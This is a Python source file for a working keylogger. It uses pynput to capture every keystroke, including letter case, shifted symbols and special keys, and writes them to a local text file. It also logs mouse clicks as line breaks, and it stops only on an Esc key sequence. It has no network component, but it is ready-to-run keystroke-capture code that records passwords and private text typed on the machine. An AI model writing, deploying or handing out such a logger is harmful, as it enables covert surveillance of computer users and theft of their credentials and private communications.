from pynput.keyboard import Key, Listener, KeyCode
from pynput.mouse import Listener as MouseListener

log_file = "data.txt"
sequence_to_stop = ['0' ] #your esc sequence
current_sequence = []
esc_pressed = False
shift_pressed = False
caps_lock_on = False
pressed_keys = set()  # Set to track pressed keys

# Mapping of number keys to their corresponding shift symbols
shift_symbols = {
    '1': '!', '2': '@', '3': '#', '4': '$',
    '5': '%', '6': '^', '7': '&', '8': '*',
    '9': '(', '0': ')'
}

# Mapping for Numpad keys to their corresponding digits
numpad_keys = {
    96: '0', 97: '1', 98: '2', 99: '3',
    100: '4', 101: '5', 102: '6', 103: '7',
    104: '8', 105: '9'
}

def on_press(key):
    global current_sequence, esc_pressed, shift_pressed, caps_lock_on, pressed_keys

    if key in pressed_keys:  # Avoid duplicate captures
        return
    pressed_keys.add(key)

    try:
        with open(log_file, "a") as f:

            # Track if Shift or CapsLock is being pressed

            if key in [Key.shift, Key.shift_r]:
                shift_pressed = True
                f.write('<CAPS ON>')  # Show "CAPS ON" when Shift is pressed
            elif key == Key.caps_lock:
                caps_lock_on = not caps_lock_on
                f.write('<CAPS ON>' if caps_lock_on else '<CAPS OFF>')  # Toggle Caps Lock state

            # Handle specific keys

            if key == Key.space:
                f.write(' ')
                current_sequence.append(' ')
            elif key == Key.enter:
                f.write('\n')
                current_sequence.append('\n')
            elif key == Key.backspace:
                f.write('<BACKSPACE>')
                current_sequence.append('<BACKSPACE>')
            elif key == Key.tab:
                f.write('<TAB>')
                current_sequence.append('<TAB>')
            elif hasattr(key, 'vk') and key.vk in numpad_keys:
                f.write(numpad_keys[key.vk])
                current_sequence.append(numpad_keys[key.vk])
            elif hasattr(key, 'char') and key.char is not None:
                # Handle letters with shift and caps lock
                if key.char.isalpha():
                    if (shift_pressed and not caps_lock_on) or (caps_lock_on and not shift_pressed):
                        f.write(key.char.upper())
                        current_sequence.append(key.char.upper())
                    else:
                        f.write(key.char.lower())
                        current_sequence.append(key.char.lower())

                # Handle numbers and their shift symbols

                elif key.char.isdigit():
                    if shift_pressed and key.char in shift_symbols:
                        f.write(shift_symbols[key.char])
                        current_sequence.append(shift_symbols[key.char])
                    else:
                        f.write(key.char)
                        current_sequence.append(key.char)
                else:
                    f.write(key.char)  # For other characters
                    current_sequence.append(key.char)
            elif isinstance(key, Key):
                f.write(f'<{key.name}>\t')
                current_sequence.append(f'<{key.name}>\t')

        # Check if ESC is being held down and if the sequence matches

        if esc_pressed and len(current_sequence) >= len(sequence_to_stop):
            if current_sequence[-len(sequence_to_stop):] == sequence_to_stop:
                return False  # Stop listener

    except IOError as e:
        print(f"Error: Unable to write due to Exception: {e}")
    except TypeError as e:
        print(f"TypeError: {e}")

def on_release(key):
    global esc_pressed, shift_pressed, pressed_keys

    if key in pressed_keys:
        pressed_keys.remove(key)

    # Check if ESC key is released

    if key == Key.esc:
        esc_pressed = False
    else:
        # Remove keys from sequence if ESC is not pressed

        if len(current_sequence) > len(sequence_to_stop):
            current_sequence.pop(0)

    # Stop if ESC key is pressed

    if key == Key.esc:
        esc_pressed = True

    # Track if Shift is released

    if key in [Key.shift, Key.shift_r]:
        shift_pressed = False

def on_click(x, y, button, pressed):
    global current_sequence

    if pressed:
        with open(log_file, "a") as f:
            f.write('\n')  # Shift to new line for mouse clicks
            current_sequence.append('\n')

# Set up the keyboard listener

with Listener(on_press=on_press, on_release=on_release) as keyboard_listener:
    # Set up the mouse listener

    with MouseListener(on_click=on_click) as mouse_listener:
        keyboard_listener.join()
